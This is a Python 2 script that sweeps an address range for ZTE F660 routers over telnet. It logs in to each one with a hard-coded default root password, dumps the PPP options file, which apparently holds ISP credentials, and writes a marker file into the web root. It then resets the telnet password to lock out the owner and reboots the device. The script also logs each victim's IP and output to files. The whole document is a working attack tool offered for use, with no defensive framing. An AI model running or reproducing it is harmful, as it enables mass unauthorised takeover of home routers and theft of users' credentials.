#!/usr/bin/env python

import sys
import telnetlib
import socket
import re

port = 23
user = 'root'
password = 'Zte521'
def retBanner(ip, port):
    try:
        socket.setdefaulttimeout(2)
        s = socket.socket()
        s.connect((ip, port))
        banner = s.recv(1024)
        return banner
    except:
   	return 
def checkVulns(banner):
    if banner and 'F660' in banner:
        print 'Vulnerable'
        a=1
    else:
        print 'Not Vulnerable'
        a=0
def attack(ip):
    file = open("id_rusia.txt","a")
    file1 = open("ip_rusia.txt","a")
    tn=telnetlib.Telnet(ip,port)
    tn.read_until('Login: ')
    tn.write(user+"\n")
    tn.read_until('Password: ')
    tn.write(password+ "\n")
    tn.write('cat /var/tmp/ppp/options.oe0\n')
    tn.write('mkdir /home/httpd/SE2016\n')
    tn.write('echo "KCAHilaB" > /home/httpd/SE2016/qe3.txt\n')
    tn.write('sendcmd 1 DB set TelnetCfg 0 TS_UPwd samuraiX\n')
    tn.write('sendcmd 1 DB save\n')
    tn.write('reboot;exit\n')
    printid = tn.read_until('@')
    #tn.write('reboot\n')
    #tn.write('exit')
    if printid and '@' in printid:
        print(printid)
        file1.write(ip + '\n')
        file.write('------------------\n')
        file.write('IP : '+ip+'\n') 
        file.write(printid +'\n')
        file.write('------------------\n')
        file.close()
        file1.close()
        tn.close()
        print 'Done!\n'
        
    else:
        print 'Password Incorect!'
        a=0
def main():
    for x in range(1,254):
        for y in range(1,254):
            ip = sys.argv[1]+'.'+ str(x)+'.'+str(y)
            banner = retBanner(ip, port)
            #print banner
            if banner and 'F660' in banner:
               print ip + ' Vulnerable!'
               attack(ip)
            else:
               print ip + ' NOT Vulnerable!'
               a=0

if __name__ == '__main__':
    main()
